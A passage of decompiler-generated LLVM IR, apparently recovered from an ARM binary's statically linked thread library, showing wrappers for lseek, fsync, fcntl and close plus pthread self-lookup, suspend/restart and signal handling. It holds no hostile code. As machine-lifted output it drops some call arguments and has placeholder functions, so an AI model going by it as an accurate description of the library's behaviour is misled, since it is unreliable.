  %v3_d264 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d24c)
  %v0_d268 = load i32, i32* @r5, align 4
  store i32 %v0_d268, i32* @r1, align 4
  %v0_d26c = load i32, i32* @r6, align 4
  store i32 %v0_d26c, i32* @r2, align 4
  %v0_d270 = load i32, i32* @r4, align 4
  store i32 %v0_d270, i32* @r0, align 4
  %v3_d274 = call i32 @__libc_msync(i32 %v0_d270, i32 %v0_d268, i32 %v0_d26c)
  store i32 %v3_d274, i32* @r4, align 4
  %v2_d280 = load i32, i32* %stack_var_-20, align 4
  %v2_d284 = trunc i32 %v2_d280 to i8
  %v3_d284 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d284, i32 0)
  %v0_d288 = load i32, i32* @r4, align 4
  ret i32 %v0_d288
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_d298 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  %v3_d2b4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d298)
  %v0_d2b8 = load i32, i32* @r5, align 4
  %v0_d2c0 = load i32, i32* @r6, align 4
  %v0_d2c4 = load i32, i32* @r4, align 4
  %v4_d2c8 = call i32 @__libc_lseek64(i32 %v0_d2c0, i32 %v0_d2c4, i32 %v0_d2b8, i32 %arg4)
  store i32 %v4_d2c8, i32* @r4, align 4
  store i32 %v0_d2c4, i32* @r5, align 4
  %v2_d2d4 = load i32, i32* %stack_var_-24, align 4
  %v2_d2dc = trunc i32 %v2_d2d4 to i8
  %v3_d2dc = call i32 @__GI_pthread_setcanceltype(i8 %v2_d2dc, i32 0)
  %v0_d2e0 = load i32, i32* @r4, align 4
  ret i32 %v0_d2e0
}

define i32 @lseek() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v6_d2f0 = load i32, i32* @r5, align 4
  %v9_d2f0 = load i32, i32* @r6, align 4
  %v2_d2f4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_d2f8 = load i32, i32* @r0, align 4
  store i32 %v0_d2f8, i32* @r4, align 4
  %v0_d2fc = load i32, i32* @r1, align 4
  store i32 %v0_d2fc, i32* @r5, align 4
  %v0_d300 = load i32, i32* @r2, align 4
  store i32 %v0_d300, i32* @r6, align 4
  %v3_d30c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d2f4)
  %v0_d310 = load i32, i32* @r5, align 4
  store i32 %v0_d310, i32* @r1, align 4
  %v0_d314 = load i32, i32* @r6, align 4
  store i32 %v0_d314, i32* @r2, align 4
  %v0_d318 = load i32, i32* @r4, align 4
  store i32 %v0_d318, i32* @r0, align 4
  %v3_d31c = call i32 @__GI___libc_lseek(i32 %v0_d318, i32 %v0_d310, i32 %v0_d314)
  store i32 %v3_d31c, i32* @r4, align 4
  %v2_d328 = load i32, i32* %stack_var_-20, align 4
  %v2_d32c = trunc i32 %v2_d328 to i8
  %v3_d32c = call i32 @__GI_pthread_setcanceltype(i8 %v2_d32c, i32 0)
  %v0_d330 = load i32, i32* @r4, align 4
  store i32 %v6_d2f0, i32* @r5, align 4
  store i32 %v9_d2f0, i32* @r6, align 4
  ret i32 %v0_d330
}

define i32 @fsync() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_d340 = ptrtoint i32* %stack_var_-12 to i32
  %v0_d348 = load i32, i32* @r0, align 4
  store i32 %v0_d348, i32* @r4, align 4
  %v3_d350 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d340)
  %v0_d354 = load i32, i32* @r4, align 4
  store i32 %v0_d354, i32* @r0, align 4
  %v1_d358 = call i32 @__libc_fsync(i32 %v0_d354)
  store i32 %v1_d358, i32* @r4, align 4
  %v2_d364 = load i32, i32* %stack_var_-12, align 4
  %v2_d368 = trunc i32 %v2_d364 to i8
  %v3_d368 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d368, i32 0)
  %v0_d36c = load i32, i32* @r4, align 4
  ret i32 %v0_d36c
}

define i32 @fcntl() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_d378 = load i32, i32* @r1, align 4
  %v0_d384 = load i32, i32* @r0, align 4
  store i32 %v0_d384, i32* @r4, align 4
  %v2_d388 = ptrtoint i32* %stack_var_-24 to i32
  %v3_d390 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d388)
  %v0_d3a0 = load i32, i32* @r4, align 4
  store i32 %v0_d3a0, i32* @r0, align 4
  %v2_d3a8 = call i32 @__libc_fcntl(i32 %v0_d3a0, i32 %v3_d378)
  store i32 %v2_d3a8, i32* @r4, align 4
  %v3_d3b4 = load i32, i32* %stack_var_-24, align 4
  %v2_d3b8 = trunc i32 %v3_d3b4 to i8
  %v3_d3b8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d3b8, i32 0)
  %v0_d3bc = load i32, i32* @r4, align 4
  ret i32 %v0_d3bc
}

define i32 @close() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_d3d0 = load i32, i32* @r4, align 4
  %v2_d3d4 = ptrtoint i32* %stack_var_-12 to i32
  %v0_d3dc = load i32, i32* @r0, align 4
  store i32 %v0_d3dc, i32* @r4, align 4
  %v3_d3e4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d3d4)
  %v0_d3e8 = load i32, i32* @r4, align 4
  store i32 %v0_d3e8, i32* @r0, align 4
  %v1_d3ec = call i32 @__libc_close(i32 %v0_d3e8)
  store i32 %v1_d3ec, i32* @r4, align 4
  %v2_d3f8 = load i32, i32* %stack_var_-12, align 4
  %v2_d3fc = trunc i32 %v2_d3f8 to i8
  %v3_d3fc = call i32 @__GI_pthread_setcanceltype(i8 %v2_d3fc, i32 0)
  %v0_d400 = load i32, i32* @r4, align 4
  store i32 %v3_d3d0, i32* @r4, align 4
  ret i32 %v0_d400

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 30, 31, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 52, 53, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 36, 37, 38, 39, 40, 41, 42, 43, 22, 23, 50, 51, 32, 33, 26, 27, 34, 35, 44, 45, 46, 47, 28, 29, 48, 49, 24, 25 }
}

define i32 @__libc_current_sigrtmin(i32 %arg1) local_unnamed_addr {
entry:
  %v2_d410 = load i32, i32* @global_var_2a878.340, align 4
  ret i32 %v2_d410
}

define i32 @__libc_current_sigrtmax(i32 %arg1) local_unnamed_addr {
entry:
  %v2_d420 = load i32, i32* @global_var_2a87c.342, align 4
  ret i32 %v2_d420
}

define i32 @__libc_allocate_rtsig(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_d430 = load i32, i32* @global_var_2a878.340, align 4
  %v1_d434 = add i32 %v2_d430, 1
  %v7_d434 = icmp eq i32 %v1_d434, 0
  br i1 %v7_d434, label %dec_label_pc_d46c, label %dec_label_pc_d444

dec_label_pc_d444:                                ; preds = %entry
  %v2_d444 = load i32, i32* @global_var_2a87c.342, align 4
  %v8_d44c = icmp sgt i32 %v2_d430, %v2_d444
  br i1 %v8_d44c, label %dec_label_pc_d46c, label %dec_label_pc_d450

dec_label_pc_d450:                                ; preds = %dec_label_pc_d444
  %v2_d450 = icmp eq i32 %arg1, 0
  br i1 %v2_d450, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_d450
  store i32 %v1_d434, i32* @global_var_2a878.340, align 4
  br label %dec_label_pc_d470

.thread1:                                         ; preds = %dec_label_pc_d450
  %v1_d458 = add i32 %v2_d444, -1
  store i32 %v1_d458, i32* @global_var_2a87c.342, align 4
  br label %dec_label_pc_d470

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d444, %entry
  br label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %.thread, %.thread1, %dec_label_pc_d46c
  %v0_d470 = phi i32 [ %v2_d444, %.thread1 ], [ %v2_d430, %.thread ], [ -1, %dec_label_pc_d46c ]
  ret i32 %v0_d470

; uselistorder directives
  uselistorder label %dec_label_pc_d470, { 2, 1, 0 }
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v9_d480 = icmp eq i32 %arg1, %arg2
  %. = zext i1 %v9_d480 to i32
  ret i32 %.
}

define i32 @__pthread_find_self(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_263e0.346 to i32), i32* @r2, align 4
  %v1_d494 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_d494, i32* @r1, align 4
  br label %dec_label_pc_d4a0

dec_label_pc_d49c:                                ; preds = %dec_label_pc_d4ac, %dec_label_pc_d4a0
  %v1_d49c = add i32 %v0_d49c, 16
  store i32 %v1_d49c, i32* @r2, align 4
  br label %dec_label_pc_d4a0

dec_label_pc_d4a0:                                ; preds = %entry, %dec_label_pc_d49c
  %v0_d49c = phi i32 [ ptrtoint (i32* @global_var_263e0.346 to i32), %entry ], [ %v1_d49c, %dec_label_pc_d49c ]
  %v1_d4a0 = add i32 %v0_d49c, 8
  %v2_d4a0 = inttoptr i32 %v1_d4a0 to i32*
  %v3_d4a0 = load i32, i32* %v2_d4a0, align 4
  %tmp4 = icmp ugt i32 %v1_d494, %v3_d4a0
  br i1 %tmp4, label %dec_label_pc_d49c, label %dec_label_pc_d4ac

dec_label_pc_d4ac:                                ; preds = %dec_label_pc_d4a0
  %v1_d4ac = add i32 %v0_d49c, 12
  %v2_d4ac = inttoptr i32 %v1_d4ac to i32*
  %v3_d4ac = load i32, i32* %v2_d4ac, align 4
  %v3_d4b0 = icmp ult i32 %v1_d494, %v3_d4ac
  br i1 %v3_d4b0, label %dec_label_pc_d49c, label %dec_label_pc_d4b8

dec_label_pc_d4b8:                                ; preds = %dec_label_pc_d4ac
  %v2_d4b0.le = sub i32 %v1_d494, %v3_d4ac
  %v5_d4b0 = xor i32 %v2_d4b0.le, %v1_d494
  %v4_d4b0 = xor i32 %v3_d4ac, %v1_d494
  %v6_d4b0 = and i32 %v5_d4b0, %v4_d4b0
  %v7_d4b0 = icmp slt i32 %v6_d4b0, 0
  %v9_d4b0 = icmp eq i32 %v1_d494, %v3_d4ac
  store i1 %v7_d4b0, i1* @cpsr_v, align 1
  store i1 %v9_d4b0, i1* @cpsr_z, align 1
  ret i32 %v3_d4a0

; uselistorder directives
  uselistorder i32 %v3_d4ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d49c, { 1, 2, 0 }
  uselistorder i32 %v1_d494, { 5, 1, 2, 0, 4, 3, 6 }
  uselistorder label %dec_label_pc_d4a0, { 1, 0 }
}

define i32 @_thread_self.3() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_d4c4 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_d4c8 = load i32, i32* @sp, align 4
  %v3_d4c8 = icmp ult i32 %v0_d4c8, %v2_d4c4
  %v1_d4cc = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_d4c8, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_d4e8, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2a3e0 to i32), %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_d4e8 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_d4dc = load i32, i32* @global_var_2b170.180, align 4
  %v3_d4e0 = icmp ult i32 %v0_d4c8, %v2_d4dc
  br i1 %v3_d4e0, label %bb4, label %dec_label_pc_d4e8

dec_label_pc_d4e8:                                ; preds = %bb3
  %v2_d4ec = load i32, i32* @global_var_2b174.182, align 4
  %v3_d4f0 = icmp ult i32 %v0_d4c8, %v2_d4ec
  br i1 %v3_d4f0, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_d4e8, %bb3
  %v2_d500 = load i32, i32* @global_var_2f558.186, align 4
  %v3_d504 = and i32 %v1_d4cc, -2097152
  %v4_d504 = xor i32 %v3_d504, -2097152
  %v2_d50c = icmp eq i32 %v2_d500, 0
  %v1_d510 = sub i32 -477, %v4_d504
  br i1 %v2_d50c, label %dec_label_pc_d51c, label %dec_label_pc_d518

dec_label_pc_d518:                                ; preds = %bb4
  %v1_d518 = call i32 @__pthread_find_self(i32 %v1_d510)
  br label %dec_label_pc_d51c

dec_label_pc_d51c:                                ; preds = %bb4, %dec_label_pc_d518
  %v0_d51c = phi i32 [ %v1_d510, %bb4 ], [ %v1_d518, %dec_label_pc_d518 ]
  %v1_d51c = add i32 %v0_d51c, -3
  ret i32 %v1_d51c

; uselistorder directives
  uselistorder i32 %v1_d510, { 1, 0 }
  uselistorder label %dec_label_pc_d51c, { 1, 0 }
}

define i32 @__GI_pthread_self() local_unnamed_addr {
entry:
  %v0_d540 = call i32 @_thread_self.3()
  %v1_d544 = add i32 %v0_d540, 16
  %v2_d544 = inttoptr i32 %v1_d544 to i32*
  %v3_d544 = load i32, i32* %v2_d544, align 4
  ret i32 %v3_d544
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v1_d54c = load i32, i32* @r0, align 4
  ret i32 %v1_d54c
}

define i32 @__pthread_setconcurrency(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_2b184.354, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  %v2_d568 = load i32, i32* @global_var_2b184.354, align 4
  ret i32 %v2_d568

; uselistorder directives
  uselistorder i32* @global_var_2b184.354, { 1, 0 }
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-500 = alloca i32, align 4
  %stack_var_-508 = alloca i32, align 4
  %v3_d574 = load i32, i32* @r4, align 4
  store i32 %tmp, i32* %stack_var_-508, align 4
  %v2_d584 = ptrtoint i32* %stack_var_-500 to i32
  store i32 %v2_d584, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  %v3_d58c = call i32 @__sigsetjmp(i32* nonnull %stack_var_-500, i32 1)
  store i32 %v3_d58c, i32* %r0.global-to-local, align 4
  %v2_d590 = icmp eq i32 %v3_d58c, 0
  br i1 %v2_d590, label %dec_label_pc_d59c, label %.dec_label_pc_d658_crit_edge

.dec_label_pc_d658_crit_edge:                     ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %.pre = add i32 %arg1, 36
  %.pre2 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_d658

dec_label_pc_d59c:                                ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_d5a0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_d5a0, i32* @r4, align 4
  %v2_d5a8 = add i32 %arg1, 36
  %v3_d5a8 = inttoptr i32 %v2_d5a8 to i32*
  store i32 %v2_d584, i32* %v3_d5a8, align 4
  %v0_d5ac = load i32, i32* %r0.global-to-local, align 4
  %v1_d5ac = load i32, i32* %r2.global-to-local, align 4
  %v2_d5ac = add i32 %v1_d5ac, 32
  %v3_d5ac = inttoptr i32 %v2_d5ac to i32*
  store i32 %v0_d5ac, i32* %v3_d5ac, align 4
  store i32 %v2_d5a0, i32* @r0, align 4
  %v1_d5b4 = call i32 @sigemptyset(i32 %v2_d5a0)
  store i32 %v2_d5a0, i32* @r0, align 4
  %v2_d5c0 = load i32, i32* @global_var_2a7a8.307, align 4
  %v2_d5c4 = call i32 @__GI_sigaddset(i32 %v2_d5a0, i32 %v2_d5c0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_d5d0 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_d5d0, i32* %r2.global-to-local, align 4
  %v3_d5d4 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_d5d4 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_d5d4, i32 %v2_d5d0)
  store i32 %v4_d5d4, i32* %r0.global-to-local, align 4
  %v2_d5dc = ptrtoint i32* %stack_var_-16 to i32
  %v2_d630 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_d5d8

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d638, %dec_label_pc_d59c
  store i32 %v2_d5dc, i32* %r0.global-to-local, align 4
  %v0_d5e0 = call i32 @gettimeofday()
  store i32 %v0_d5e0, i32* %r0.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v2_d5f0 = load i32, i32* %stack_var_-508, align 4
  %v1_d5f4 = inttoptr i32 %v2_d5f0 to i32*
  %v2_d5f4 = load i32, i32* %v1_d5f4, align 4
  store i32 %v2_d5f4, i32* %r2.global-to-local, align 4
  %v3_d5f4 = add i32 %v2_d5f0, 4
  %v4_d5f4 = inttoptr i32 %v3_d5f4 to i32*
  %v5_d5f4 = load i32, i32* %v4_d5f4, align 4
  %tmp16 = mul i32 %tmp5, -1000
  %v2_d5f8 = add i32 %v5_d5f4, %tmp16
  %v3_d5fc = load i32, i32* %stack_var_-16, align 4
  store i32 0, i32* @r1, align 4
  %v2_d604 = sub i32 %v2_d5f4, %v3_d5fc
  store i32 %v2_d604, i32* %r2.global-to-local, align 4
  %v8_d608 = icmp slt i32 %v2_d5f8, 0
  %v1_d60c = sext i1 %v8_d608 to i32
  %v1_d60c.v2_d604 = add i32 %v2_d604, %v1_d60c
  store i32 %v1_d60c.v2_d604, i32* %stack_var_-24, align 4
  %v2_d620 = add i32 %v2_d5f8, 1000000000
  store i32 %v2_d620, i32* @lr, align 4
  %v1_d62c = icmp slt i32 %v1_d60c.v2_d604, 0
  store i32 %v2_d630, i32* @r0, align 4
  br i1 %v1_d62c, label %dec_label_pc_d644, label %dec_label_pc_d638

dec_label_pc_d638:                                ; preds = %dec_label_pc_d5d8
  %v1_d638 = call i32 @__libc_nanosleep(i32 %v2_d630)
  store i32 %v1_d638, i32* %r0.global-to-local, align 4
  %v2_d63c = icmp eq i32 %v1_d638, 0
  br i1 %v2_d63c, label %dec_label_pc_d644, label %dec_label_pc_d5d8

dec_label_pc_d644:                                ; preds = %dec_label_pc_d638, %dec_label_pc_d5d8
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d650 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_d650 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_d650, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d658

dec_label_pc_d658:                                ; preds = %.dec_label_pc_d658_crit_edge, %dec_label_pc_d644
  %v3_d660.pre-phi = phi i32* [ %.pre2, %.dec_label_pc_d658_crit_edge ], [ %v3_d5a8, %dec_label_pc_d644 ]
  store i32 0, i32* %v3_d660.pre-phi, align 4
  store i32 %v3_d574, i32* @r4, align 4
  %v8_d668 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_d668

; uselistorder directives
  uselistorder i32 %v1_d60c.v2_d604, { 1, 0 }
  uselistorder i32 %v2_d5f8, { 1, 0 }
  uselistorder i32 %v2_d5f0, { 1, 0 }
  uselistorder i32 %v2_d5a0, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 5, 4, 7, 6, 11, 9, 12, 10, 0 }
  uselistorder i32 (i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 1000000000, { 1, 0 }
  uselistorder i32 (i32*, i32)* @__sigsetjmp, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_d658, { 1, 0 }
}

define i32 @__pthread_restart_new() local_unnamed_addr {
entry:
  %v0_d680 = call i32 @kill()
  %v0_d684 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d684, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_d684 = load i32, i32* @r2, align 4
  %v2_d684 = load i32, i32* @r8, align 4
  %v5_d684 = udiv i32 %v2_d684, 32768
  %v6_d684 = and i32 %v5_d684, %v1_d684
  store i32 %v6_d684, i32* @sl, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_d680

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__pthread_wait_for_restart_signal(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v3_d688 = load i32, i32* @r4, align 4
  %v2_d68c = ptrtoint i32* %stack_var_-140 to i32
  store i32 %arg1, i32* %r5.global-to-local, align 4
  store i32 %v2_d68c, i32* @r4, align 4
  %v4_d6a4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_d68c)
  store i32 %v2_d68c, i32* @r0, align 4
  %v1_d6b4 = call i32 @__GI_sigdelset(i32 %v2_d68c)
  %v2_d6bc = add i32 %arg1, 32
  %v3_d6bc = inttoptr i32 %v2_d6bc to i32*
  store i32 0, i32* %v3_d6bc, align 4
  %v1_d6c4 = bitcast i32* %stack_var_-140 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_d6c0

dec_label_pc_d6c0:                                ; preds = %dec_label_pc_d6c0, %entry
  %v2_d6c4 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_d6c4)
  %v2_d6cc = load i32, i32* @global_var_2a7a8.307, align 4
  store i32 %v2_d6cc, i32* @r2, align 4
  %v0_d6d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_d6d0 = add i32 %v0_d6d0, 32
  %v2_d6d0 = inttoptr i32 %v1_d6d0 to i32*
  %v3_d6d0 = load i32, i32* %v2_d6d0, align 4
  %v9_d6d4 = icmp eq i32 %v3_d6d0, %v2_d6cc
  br i1 %v9_d6d4, label %dec_label_pc_d6dc, label %dec_label_pc_d6c0

dec_label_pc_d6dc:                                ; preds = %dec_label_pc_d6c0
  store i32 %v3_d688, i32* @r4, align 4
  ret i32 %v2_d6c4

; uselistorder directives
  uselistorder i32 %v2_d68c, { 1, 0, 3, 2 }
  uselistorder i32 (%_TYPEDEF_sigset_t*)* @__libc_sigsuspend, { 1, 0 }
}

define i32 @_suspend.4(i32 %arg1) local_unnamed_addr {
entry:
  %v0_d6e8 = load i32, i32* @r0, align 4
  %v1_d6e8 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_d6e8)
  ret i32 %v1_d6e8
}

define i32 @pthread_onexit_process() local_unnamed_addr {
entry:
  %stack_var_-160 = alloca i32, align 4
  %v3_d6ec = load i32, i32* @r4, align 4
  %v2_d6f4 = load i32, i32* @global_var_2a7a4.195, align 4
  %v1_d6f8 = icmp slt i32 %v2_d6f4, 0
  %v2_d6fc = ptrtoint i32* %stack_var_-160 to i32
  %v0_d700 = load i32, i32* @r0, align 4
  store i32 %v0_d700, i32* @r5, align 4
  br i1 %v1_d6f8, label %dec_label_pc_d784, label %dec_label_pc_d708

dec_label_pc_d708:                                ; preds = %entry
  %v0_d708 = call i32 @_thread_self.3()
  store i32 %v0_d708, i32* %stack_var_-160, align 4
  store i32 %v0_d708, i32* @r4, align 4
  br label %dec_label_pc_d718

dec_label_pc_d718:                                ; preds = %dec_label_pc_d734, %dec_label_pc_d708
  store i32 %v2_d6fc, i32* @r1, align 4
  %v2_d720 = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_d720, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_d728 = call i32 @__libc_write(i32 %v2_d720, i32 %v2_d6fc)
  %v3_d72c = icmp eq i32 %v2_d728, -1
  br i1 %v3_d72c, label %dec_label_pc_d734, label %dec_label_pc_d744

dec_label_pc_d734:                                ; preds = %dec_label_pc_d718
  %v0_d734 = call i32 @__errno_location()
  %v1_d738 = inttoptr i32 %v0_d734 to i32*
  %v2_d738 = load i32, i32* %v1_d738, align 4
  %v7_d73c = icmp eq i32 %v2_d738, 4
  br i1 %v7_d73c, label %dec_label_pc_d718, label %dec_label_pc_d744

dec_label_pc_d744:                                ; preds = %dec_label_pc_d718, %dec_label_pc_d734
  %v0_d744 = load i32, i32* @r4, align 4
  store i32 %v0_d744, i32* @r0, align 4
  %v1_d748 = call i32 @_suspend.4(i32 %v0_d744)
  %v2_d750 = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  %v0_d754 = load i32, i32* @r4, align 4
  %v9_d754 = icmp eq i32 %v0_d754, %v2_d750
  br i1 %v9_d754, label %dec_label_pc_d75c, label %dec_label_pc_d784

dec_label_pc_d75c:                                ; preds = %dec_label_pc_d744
  %v3_d764 = load i32, i32* @global_var_2a5d4.189, align 4
  %v3_d76c = call i32 @waitpid(i32 %v3_d764, i32 0, i32 -2147483648)
  store i32 0, i32* @global_var_2b170.180, align 4
  store i32 0, i32* @global_var_2b174.182, align 4
  br label %dec_label_pc_d784

dec_label_pc_d784:                                ; preds = %dec_label_pc_d744, %entry, %dec_label_pc_d75c
  %v11_d788 = phi i32 [ %v1_d748, %dec_label_pc_d744 ], [ %v0_d700, %entry ], [ %v3_d76c, %dec_label_pc_d75c ]
  store i32 %v3_d6ec, i32* @r4, align 4
  ret i32 %v11_d788

; uselistorder directives
  uselistorder i32 %v2_d6fc, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d784, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d744, { 1, 0 }
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d7a0 = load i32, i32* @r4, align 4
  store i32 %v3_d7a0, i32* %stack_var_-20, align 4
  %v6_d7a0 = load i32, i32* @r5, align 4
  %v0_d7a4 = call i32 @_thread_self.3()
  store i32 ptrtoint (i32* @global_var_2a7a4.195 to i32), i32* @r5, align 4
  %v2_d7ac = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_d7ac, i32* %r3.global-to-local, align 4
  %v7_d7b0 = icmp eq i32 %v2_d7ac, -1
  store i32 ptrtoint (i32* @global_var_2b170.180 to i32), i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2f570.368 to i32), i32* @r7, align 4
  store i32 %v0_d7a4, i32* @r4, align 4
  br i1 %v7_d7b0, label %dec_label_pc_d7f8, label %dec_label_pc_d7c4

dec_label_pc_d7c4:                                ; preds = %entry
  %v2_d7c4 = load i32, i32* @global_var_2b170.180, align 4
  store i32 %v2_d7c4, i32* @r0, align 4
  %v0_d7c8 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_2b174.182, align 4
  %v2_d7d8 = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_d7d8, i32* @r0, align 4
  %v1_d7dc = load i32, i32* @r6, align 4
  %v2_d7dc = inttoptr i32 %v1_d7dc to i32*
  store i32 0, i32* %v2_d7dc, align 4
  %v1_d7e0 = call i32 @__libc_close(i32 %v2_d7d8)
  %v2_d7e4 = load i32, i32* @global_var_2f570.368, align 4
  store i32 %v2_d7e4, i32* @r0, align 4
  %v1_d7e8 = call i32 @__libc_close(i32 %v2_d7e4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_d7f0 = load i32, i32* @r5, align 4
  %v2_d7f0 = inttoptr i32 %v1_d7f0 to i32*
  store i32 -1, i32* %v2_d7f0, align 4
  %v0_d7f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d7f4 = load i32, i32* @r7, align 4
  %v2_d7f4 = inttoptr i32 %v1_d7f4 to i32*
  store i32 %v0_d7f4, i32* %v2_d7f4, align 4
  br label %dec_label_pc_d7f8

dec_label_pc_d7f8:                                ; preds = %entry, %dec_label_pc_d7c4
  %v0_d7f8 = call i32 @__libc_getpid()
  %v1_d800 = load i32, i32* @r4, align 4
  %v2_d800 = add i32 %v1_d800, 76
  %v3_d800 = inttoptr i32 %v2_d800 to i32*
  store i32 ptrtoint (i32* @global_var_2d1cc.371 to i32), i32* %v3_d800, align 4
  %v0_d808 = load i32, i32* @r4, align 4
  store i32 %v0_d808, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_2d1c8.374 to i32), i32* %r3.global-to-local, align 4
  %v2_d810 = add i32 %v0_d808, 20
  %v3_d810 = inttoptr i32 %v2_d810 to i32*
  store i32 %v0_d7f8, i32* %v3_d810, align 4
  %v0_d814 = load i32, i32* %r3.global-to-local, align 4
  %v1_d814 = load i32, i32* @r4, align 4
  %v2_d814 = add i32 %v1_d814, 68
  %v3_d814 = inttoptr i32 %v2_d814 to i32*
  store i32 %v0_d814, i32* %v3_d814, align 4
  %v0_d818 = load i32, i32* @r4, align 4
  %v2_d818 = inttoptr i32 %v0_d818 to i32*
  store i32 %v0_d818, i32* %v2_d818, align 4
  %v0_d81c = load i32, i32* @r4, align 4
  %v2_d81c = add i32 %v0_d81c, 4
  %v3_d81c = inttoptr i32 %v2_d81c to i32*
